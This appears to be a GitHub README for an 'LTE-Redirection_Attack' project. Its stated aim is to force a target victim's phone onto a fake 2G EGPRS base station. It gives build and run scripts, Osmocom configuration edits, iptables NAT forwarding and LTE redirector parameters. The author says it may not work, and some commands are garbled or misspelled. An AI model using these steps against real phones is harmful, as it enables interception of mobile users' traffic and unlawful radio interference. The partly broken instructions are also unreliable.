[build](https://youtu.be/0aruLybY__w)

# LTE-Redirection_Attack

To be more transparent I don't even know if it is still working, I am alone in this project and testing is sometime right or othertimes wrong.
I share it for loving free information but be kind with the dev :) i am not really the "best" at all.
like i say on my github abstract it is what it intent to do not what it do.
pull requests and issues (if they help to make things going further are really welcome)
Have a nice hacking day ;)

Force target victim to unsafe network


Tested on ubuntu 22.04

## Build
```bash
sudo ./build.sh
```


## Run

```bash
sudo ./run.sh
```

2G EGPRS Fake base Station :

Change if not in osmocom terminal osmo-bsc.cfg remote ip 192.168.1.23 by your internet interface : remote ip 192.168.X.X
Change in osmo-sgsn.cfg bind udp local, listen 192.168.1.23 by yours


In Osmocom Popped Terminal (change MCC//MNC accordingly in osmo-bsc.cfg osmo-bsc.cfg)

```bash
./tun.sh
./osmo-all.sh start
osmo-trx-uhd
```

Forward your ip in host terminal:
```bash
bash reset_iptables.sh
./srsepc_if_masq.sh your_interface
######?????  iptables -A POSTROUTING -t nat -s 176.16.32.0/20 ! -d 176.32.16.0/20 -j MASQUERADE
```


LTE Node redirector

```bash
write mcc (replace)
write mnc (relace)
wirte tracking_area_code (replace)
write mcc (replace)
write mnc (replace)
write band (replace)
write dl_earfcn (replace)
write tx_gain 80
write rx_gain 30
start
``` 
